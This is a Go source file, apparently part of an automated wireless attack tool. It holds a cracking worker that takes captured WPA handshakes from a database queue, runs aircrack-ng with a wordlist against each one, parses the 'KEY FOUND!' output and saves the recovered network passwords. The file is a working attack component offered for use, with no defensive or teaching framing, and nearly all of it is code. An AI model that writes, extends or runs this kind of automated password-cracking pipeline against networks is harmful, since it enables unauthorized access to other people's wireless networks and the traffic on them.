package src

import (
	"bufio"
	"log"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	crackQueue     []CrackTarget
	crackQueueLock sync.Mutex
	isProcessing   bool
	processingLock sync.Mutex
)

type CrackTarget struct {
	BSSID         string
	ESSID         string
	HandshakePath string
}

type Cracker struct {
	db           *Database
	wordlistPath string
	stopChan     chan bool
	wg           sync.WaitGroup
}

func NewCracker(db *Database, wordlistPath string) *Cracker {
	return &Cracker{
		db:           db,
		wordlistPath: wordlistPath,
		stopChan:     make(chan bool),
	}
}

func (c *Cracker) Start() {
	c.wg.Add(1)
	go c.crackingWorker()
}

func (c *Cracker) Stop() {
	close(c.stopChan)
	c.wg.Wait()
}

func (c *Cracker) LoadInitialTargets() error {
	targets, err := c.db.GetTargetsForCracking()
	if err != nil {
		return err
	}

	crackQueueLock.Lock()
	defer crackQueueLock.Unlock()

	for _, target := range targets {
		crackTarget := CrackTarget{
			BSSID:         target["bssid"].(string),
			ESSID:         target["essid"].(string),
			HandshakePath: target["handshakePath"].(string),
		}
		crackQueue = append(crackQueue, crackTarget)
	}

	log.Printf("[CRACKER] Loaded %d targets for cracking", len(crackQueue))
	return nil
}

func AddToCrackQueue(bssid, essid, handshakePath string) {
	crackQueueLock.Lock()
	defer crackQueueLock.Unlock()

	target := CrackTarget{
		BSSID:         bssid,
		ESSID:         essid,
		HandshakePath: handshakePath,
	}

	for _, existing := range crackQueue {
		if existing.BSSID == bssid {
			return
		}
	}

	crackQueue = append(crackQueue, target)
	log.Printf("[CRACKER] Added %s (%s) to crack queue", essid, bssid)
}

func (c *Cracker) crackingWorker() {
	defer c.wg.Done()
	
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.stopChan:
			return
		case <-ticker.C:
			c.processQueue()
		}
	}
}

func (c *Cracker) processQueue() {
	processingLock.Lock()
	if isProcessing {
		processingLock.Unlock()
		return
	}
	isProcessing = true
	processingLock.Unlock()

	defer func() {
		processingLock.Lock()
		isProcessing = false
		processingLock.Unlock()
	}()

	crackQueueLock.Lock()
	if len(crackQueue) == 0 {
		crackQueueLock.Unlock()
		return
	}

	target := crackQueue[0]
	crackQueue = crackQueue[1:]
	crackQueueLock.Unlock()

	log.Printf("[CRACKER] Processing %s (%s)", target.ESSID, target.BSSID)
	c.crackTarget(target)
}

func (c *Cracker) crackTarget(target CrackTarget) {
	cmd := exec.Command("aircrack-ng", target.HandshakePath, "-w", c.wordlistPath, "-q")
	
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[CRACKER] Failed to create stdout pipe: %v", err)
		c.db.UpdateTargetPassword(target.BSSID, "", StatusFailedToCrack)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[CRACKER] Failed to start aircrack-ng: %v", err)
		c.db.UpdateTargetPassword(target.BSSID, "", StatusFailedToCrack)
		return
	}

	scanner := bufio.NewScanner(stdout)
	var password string
	cracked := false

	for scanner.Scan() {
		line := scanner.Text()
		
		// Only log important lines, not the progress output
		if strings.Contains(line, "KEY FOUND!") {
			log.Printf("[CRACKER] %s", line)
			parts := strings.Split(line, "[")
			if len(parts) >= 2 {
				keyPart := strings.Split(parts[1], "]")
				if len(keyPart) >= 1 {
					password = strings.TrimSpace(keyPart[0])
					cracked = true
					break
				}
			}
		} else if strings.Contains(line, "Choosing first network") ||
			strings.Contains(line, "potential targets") ||
			strings.Contains(line, "handshake") ||
			strings.Contains(line, "WPA") {
			// Log these informational lines but suppress progress
			continue
		}
	}

	if err := cmd.Wait(); err != nil {
		if !cracked {
			log.Printf("[CRACKER] Failed to crack %s (%s)", target.ESSID, target.BSSID)
		}
	}

	if cracked && password != "" {
		log.Printf("[CRACKER] SUCCESS! Cracked %s (%s): %s", target.ESSID, target.BSSID, password)
		c.db.UpdateTargetPassword(target.BSSID, password, StatusCracked)
	} else {
		log.Printf("[CRACKER] FAILED to crack %s (%s)", target.ESSID, target.BSSID)
		c.db.UpdateTargetPassword(target.BSSID, "", StatusFailedToCrack)
	}
}